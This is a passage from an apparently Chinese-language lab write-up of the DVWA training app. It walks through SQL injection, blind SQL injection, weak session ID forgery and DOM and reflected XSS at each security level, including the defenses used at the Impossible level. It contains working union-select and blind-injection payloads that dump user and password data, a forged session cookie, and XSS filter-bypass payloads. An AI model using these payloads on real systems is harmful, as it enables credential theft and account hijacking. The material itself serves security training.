src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20215701.png" alt="屏幕截图 2024-02-21 215701"></p><p>然后查找user表里的字段</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20215714.png" alt="屏幕截图 2024-02-21 215714"></p><p>然后查找password的数据</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20215540.png" alt="屏幕截图 2024-02-21 215540"></p><h3 id="2-Medium-6"><a href="#2-Medium-6" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>此看完源代码后发现它对特殊字符进行了转义</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20124526.png" alt="屏幕截图 2024-02-22 124526"></p><p>而且在页面只能通过下拉菜单栏的方式来选择要输入的ID</p><p>因此我们可以选择通过使用burp改包的方式来传入我们想要输入的数据</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20115212.png" alt="屏幕截图 2024-02-22 115212"></p><p>先尝试是否存在注入</p><p>1 and 1&#x3D;1 –asd</p><p>如图:</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20115221.png" alt="屏幕截图 2024-02-22 115221"></p><p>说明存在然后我们尝试找显错位发现单引号会被转义</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20115355.png" alt="屏幕截图 2024-02-22 115355"></p><p>然后猜字段最终判断存在2个字段</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>order by <span class="hljs-number">5</span> -- asd<br><span class="hljs-symbol">1 </span>order by <span class="hljs-number">3</span> -- asd<br><span class="hljs-symbol">1 </span>order by <span class="hljs-number">2</span> -- asd<br></code></pre></td></tr></table></figure><p>显示报错位</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> -- asd<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20125540.png" alt="屏幕截图 2024-02-22 125540"></p><p>查找库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- sd</span><br></code></pre></td></tr></table></figure><p>查找当前数据库中的表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- sd</span><br></code></pre></td></tr></table></figure><p>查找表users中的字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x27757365727327</span> <span class="hljs-comment">-- sd</span><br></code></pre></td></tr></table></figure><p>查找字段中的数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>),group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- sd</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20130500.png" alt="屏幕截图 2024-02-22 130500"></p><h3 id="3-High-6"><a href="#3-High-6" class="headerlink" title="3.High"></a>3.High</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20131026.png" alt="屏幕截图 2024-02-22 131026"></p><p>这一关使用了session会话的方式来获取ID其他的跟Low没什么不同</p><p>直接在框里提交即可都不需要使用burp</p><p>如图：<br><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20131507.png" alt="屏幕截图 2024-02-22 131507"></p><h3 id="4-Impossible-6"><a href="#4-Impossible-6" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132155.png" alt="屏幕截图 2024-02-22 132155"></p><p>首先：此关的代码<code>checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</code> 是一个函数调用用于检查用户提交的 token 是否与会话中存储的 token 匹配</p><p>这种机制通常用于确保表单提交的安全性以防止跨站请求伪造（CSRF）攻击</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132158.png" alt="屏幕截图 2024-02-22 132158"></p><p>其次以上代码检验ID是否为数字只有为数字的时候才会执行查询</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132850.png" alt="屏幕截图 2024-02-22 132850"></p><p>再次有预编译语句可以有效防止SQL注入</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132706.png" alt="屏幕截图 2024-02-22 132706"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132709.png" alt="屏幕截图 2024-02-22 132709"></p><p>最后以上代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入同时只有返回的查询结果数量为一时，才会成功输出</p><h2 id="八、SQL-Injection-Blind"><a href="#八、SQL-Injection-Blind" class="headerlink" title="八、SQL Injection (Blind)"></a>八、SQL Injection (Blind)</h2><p>判断是否存在注入的两种盲注方法</p><p><strong>布尔盲注</strong></p><p>　　可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p><p><strong>时间盲注</strong></p><p>　　通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p><h3 id="1-Low-7"><a href="#1-Low-7" class="headerlink" title="1.Low"></a>1.Low</h3><p>此关没有对输入的ID进行处理但是只会返回固定的两个值</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">num大于<span class="hljs-number">0</span>输出<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> the <span class="hljs-keyword">database</span><br>num小于等于<span class="hljs-number">0</span> 输出<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">is</span> MISSING <span class="hljs-keyword">from</span> the <span class="hljs-keyword">database</span><br></code></pre></td></tr></table></figure><p>因此我们只能通过猜测来确定我们想得到的数据</p><p>查找库名（以数据库名的第一个字母为例）（最终查到的库名：dvwn）</p><p>输入__1’ and (select ascii(substr(database(),1,1)) &gt; 111) – asd__时</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20144402.png" alt="屏幕截图 2024-02-22 144402"></p><p>输入__1’ and (select ascii(substr(database(),1,1)) &gt; 99) – asd__时</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20144805.png" alt="屏幕截图 2024-02-22 144805"></p><p>最终确定数据库第一个字母对应的ascii值为100</p><p>也就是说第一个字母为d</p><ul><li>查找表名</li></ul><p><strong>1’ and (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1),1,1)) &gt; 101) – asd</strong></p><ul><li>查找表中的第一个字段名</li></ul><p><strong>1’ and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;’dvwa’ and table_name&#x3D;’guestbook’ limit 0,1),1,1)) &gt; 101) – asd</strong></p><ul><li>查找数据库中第一个表中第一个字段中的第一个数据的第一个字母</li></ul><p><strong>1’ and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt;40) – asd</strong></p><p>其余数据以此类推</p><h3 id="2-Medium-7"><a href="#2-Medium-7" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号进行转义同时在前端页面设置了下拉选择表单</p><p>以此来限制用户的输入</p><p>和普通的SQL注入方式差不多只是需要BP来抓包修改参数值</p><p>具体注入方式参考此关的low和上一关的Medium即可</p><p><strong>and (select ascii(substr(database(),1,1)) &lt;114) – asd<br>1 and (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1),1,1)) &gt; 102) –       asd<br>1 and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;’dvwa’ and table_name&#x3D;’guestbook’ limit 0,1),1,1)) &gt;100)– asd<br>1 and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt;50)– asd</strong></p><h3 id="3-High-7"><a href="#3-High-7" class="headerlink" title="3.High"></a>3.High</h3><p>此关limit限制查询只能为1条</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20152346.png" alt="屏幕截图 2024-02-22 152346"></p><p>且返回MISSING时会随机执行sleep()函数会延迟在2-4s之间</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151020.png" alt="屏幕截图 2024-02-22 151020"></p><p>除此之外跟Low没有区别</p><h3 id="4-Impossible-7"><a href="#4-Impossible-7" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><ul><li><p>Anti-CSRF token机制的加入了进一步提高了安全性，session_token是随机生成的动态值，每次向服务器请求，客户端都会携带最新从服务端已下发的session_token值向服务器请求作匹配验证，相互匹配才会验证通过</p><p>如图：</p></li></ul><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151825.png" alt="屏幕截图 2024-02-22 151825"></p><ul><li>利用is_numeric($id)函数来判断输入的id是否是数字or数字字符串，满足条件才知晓query查询语句</li></ul><p>​如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151905.png" alt="屏幕截图 2024-02-22 151905"></p><ul><li>代码采用了PDO技术 划清了代码与数据的界限 有效防御SQL注入还有 预编译语句以防止了SQL注入</li></ul><p>​如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151945.png" alt="屏幕截图 2024-02-22 151945"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151938.png" alt="屏幕截图 2024-02-22 151938"></p><ul><li>只有当返回的查询结果数量为一个记录时，才会成功输出，这样就有效预防了暴库</li></ul><p>​如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20152241.png" alt="屏幕截图 2024-02-22 152241"></p><h2 id="九、Weak-Session-IDs"><a href="#九、Weak-Session-IDs" class="headerlink" title="九、Weak Session IDs"></a>九、Weak Session IDs</h2><p>Weak Session IDs（弱会话），用户访问服务器的时候，一般服务器都会分配一个身份证 session id 给用户，用于标识。用户拿到 session id 后就会保存到 cookies 上，之后只要拿着 cookies 再访问服务器，服务器就知道你是谁了。</p><p>但是 session id 过于简单就会容易被人伪造。根本都不需要知道用户的密码就能访问，用户服务器的内容了。</p><h3 id="1-Low-8"><a href="#1-Low-8" class="headerlink" title="1.Low"></a>1.Low</h3><p>源码分析</p><p>服务器每次生成的session_id加1给客户端， <code>setcookie(&quot;dvwaSession&quot;, $cookie_value);</code>就是设置session的值</p><p>抓包查看Cookie</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20155307.png" alt="屏幕截图 2024-02-22 155307"></p><p>将以上Cookie复制</p><p>并到请求链接中：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20155803.png" alt="屏幕截图 2024-02-22 155803"></p><p>然后抓这个链接的包并将里面的Cookie值改成上面复制的Cookie发包后便可以直接登录</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20155235.png" alt="屏幕截图 2024-02-22 155235"></p><h3 id="2-Medium-8"><a href="#2-Medium-8" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>源码分析</p><p>采用time函数获取时间戳 作为cookie值</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20160101.png" alt="屏幕截图 2024-02-22 160101"></p><p>然后进行抓包</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20160554.png" alt="屏幕截图 2024-02-22 160554"></p><p>然后操作和上一关一样</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20161934.png" alt="屏幕截图 2024-02-22 161934"></p><h3 id="3-High-8"><a href="#3-High-8" class="headerlink" title="3.High"></a>3.High</h3><ul><li><p>首先使用!isset()函数对session变量进行检查，如果没有进行赋值。则设置为0，然后每一次都递增1。</p></li><li><p>然后将session变量进行MD5加密后赋值为cookie_value变量。</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165019.png" alt="屏幕截图 2024-02-22 165019"></p></li></ul><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165307.png" alt="屏幕截图 2024-02-22 165307"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>], <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li><code>dvwaSession</code>：这是要设置的 cookie 的名称。</li><li><code>$cookie_value</code>：这是要分配给 cookie 的值，通常是一个字符串。</li><li><code>time()+3600</code>：这是 cookie 的过期时间，表示当前时间戳加上 3600 秒，即 1 小时后过期。</li><li><code>&quot;/vulnerabilities/weak_id/&quot;</code>：这是指定了 cookie 可用的路径，只有在指定的路径下才能访问到这个 cookie。</li><li><code>$_SERVER[&#39;HTTP_HOST&#39;]</code>：这是指定了 cookie 可用的域名，只有在指定的域名下才能访问到这个 cookie。</li></ul><p>然后开始抓包</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165949.png" alt="屏幕截图 2024-02-22 165949"></p><p>发现请求参数其实和安全等级为medium一样的发给重发器看下</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165913.png" alt="屏幕截图 2024-02-22 165913"></p><p>进行md5解密</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165829.png" alt="屏幕截图 2024-02-22 165829"></p><p>把构造的cookie复制：<code>dvwaSession=c4ca4238a0b923820dcc509a6f75849b; security=high; PHPSESSID=48irlbhh616ri2kgj2ls9fpl78;</code></p><p>打开火狐浏览器，输入url，抓包拦截,修改cookie的值</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20170941.png" alt="屏幕截图 2024-02-22 170941"></p><h3 id="4-Impossible-8"><a href="#4-Impossible-8" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算完全不能猜测到dvwaSession的值</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222171342357.png" alt="image-20240222171342357"></p><p>注：sha1运算就是一种加密算法</p><h2 id="十、XSS-DOM"><a href="#十、XSS-DOM" class="headerlink" title="十、XSS (DOM)"></a>十、XSS (DOM)</h2><p>DOM—based XSS漏洞是基于文档对象模型的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞</p><h3 id="1-Low-9"><a href="#1-Low-9" class="headerlink" title="1.Low"></a>1.Low</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222172038704.png" alt="image-20240222172038704"></p><p>源代码显示不存在任何保护</p><p>搞个弹窗试一哈     payload:   ?default&#x3D;<script>alert("糟糕被你发现鸡脚了！！！")</script></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20172354.png" alt="屏幕截图 2024-02-22 172354"></p><h3 id="2-Medium-9"><a href="#2-Medium-9" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>代码分析</p><p>过滤掉了“&lt;script”，当函数匹配到 &lt;script 字符串的时候就会将URL后面的参数修正为 ?default&#x3D;English</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20172726.png" alt="屏幕截图 2024-02-22 172726"></p><p>我们可以换个标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload详解：</p><ul><li><code>&lt;/option&gt;&lt;/select&gt;</code>：这是一些 HTML 结束标签，可能是为了终止之前的 HTML 元素。</li><li><code>&lt;img src=x onerror=alert(1)&gt;</code>：这是一个 <code>&lt;img&gt;</code> 标签，其中的 <code>src</code> 属性被设置为 <code>x</code>，而 <code>onerror</code> 属性中包含了 JavaScript 代码 <code>alert(1)</code>。这意味着如果加载图像时发生错误就会执行 <code>alert(1)</code> 这段 JavaScript 代码因为src&#x3D;x根本不存在所以一定会执行 <code>alert(1)</code></li></ul><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20173522.png" alt="屏幕截图 2024-02-22 173522"></p><h3 id="3-High-9"><a href="#3-High-9" class="headerlink" title="3.High"></a>3.High</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20174237.png" alt="屏幕截图 2024-02-22 174237"></p><p>在以上代码中就相当于使用了白名单只能输入允许的值</p><p><strong>这里就要用到URL中的一个特殊字符#，这个字符后的数据不会发送到服务器端，相当于绕过了后端的过滤，不需要与服务端进行交互，直接在客户端处理数据的阶段执行</strong></p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?#default=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20174655.png" alt="屏幕截图 2024-02-22 174655"></p><h3 id="4-Impossible-9"><a href="#4-Impossible-9" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20174736.png" alt="屏幕截图 2024-02-22 174736"></p><p>有源码可知：</p><p>Don’t need to do anything, protction handled on the client side</p><p>不需要做任何事情，保护就在客户端</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20175009.png" alt="屏幕截图 2024-02-22 175009"></p><p>发现我们输入的任何数据全部无效了，无法实现XSS</p><h2 id="十一、XSS-Reflected"><a href="#十一、XSS-Reflected" class="headerlink" title="十一、XSS (Reflected)"></a>十一、XSS (Reflected)</h2><p>XSS反射型漏洞</p><p>反射型XSS，顾名思义在于“反射”这个一来一回的过程。反射型XSS的触发有后端的参与，而之所以触发XSS是因为后端解析用户在前端输入的带有XSS性质的脚本或者脚本的data URI编码，后端解析用户输入处理后返回给前端，由浏览器解析这段XSS脚本，触发XSS漏洞</p><h3 id="1-Low-10"><a href="#1-Low-10" class="headerlink" title="1.Low"></a>1.Low</h3><p>后端代码只是判断了 name 参数是否为空，如果不为空的话就直接打印出来。服务器并没有对 name 参数做任何的过滤和检查</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20175938.png" alt="屏幕截图 2024-02-22 175938"></p><p>因此我们直接传入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222180113189.png" alt="image-20240222180113189"></p><h3 id="2-Medium-10"><a href="#2-Medium-10" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>此关过滤了传入数据中的  <script></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222180237502.png" alt="image-20240222180237502"></p><ul><li>我们可以换个标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>至于为什么详见第十关的Medium</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20180326.png" alt="屏幕截图 2024-02-22 180326"></p><ul><li><p>还可以使用大小写绕过。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scRipt</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p>​如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20180917.png" alt="屏幕截图 2024-02-22 180917"></p><ul><li><p>或者使用双写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ript&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p></li></ul><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222180750542.png" alt="image-20240222180750542"></p><h3 id="3-High-10"><a href="#3-High-10" class="headerlink" title="3.High"></a>3.High</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20181506.png" alt="屏幕截图 2024-02-22 181506"></p><p>由上图可知：</p><p>preg_replace() 函数执行一个正则表达式的搜索和替换，“*” 代表连续匹配任意字符，“i” 代表不区分大小写</p><p>也就是说 “< script >” 标签在这里被完全过滤了，但是我们可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> = <span class="hljs-string">1</span> <span class="hljs-attr">onerror</span> = <span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20181600.png" alt="屏幕截图 2024-02-22 181600"></p><h3 id="4-Impossible-10"><a href="#4-Impossible-10" class="headerlink" title="4. Impossible"></a>4. Impossible</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20181710.png" alt="屏幕截图 2024-02-22 181710"></p><p>由图可知：</p><p>htmlspecialchars() 函数用于把预定义的字符 "<" 和 ">" 转换为 HTML 实体，防止了我们注入 HTML 标签</p><p>htmlspecialchars 函数会将 < 和 > 转换成 html 实体而不是当做标签，所以我们插入的语句并不会被执行</p><p>同时加入token防护 CSRF 攻击，进一步提高安全性</p><h2 id="十二、XSS-Stored"><a href="#十二、XSS-Stored" class="headerlink" title="十二、XSS (Stored)"></a>十二、XSS 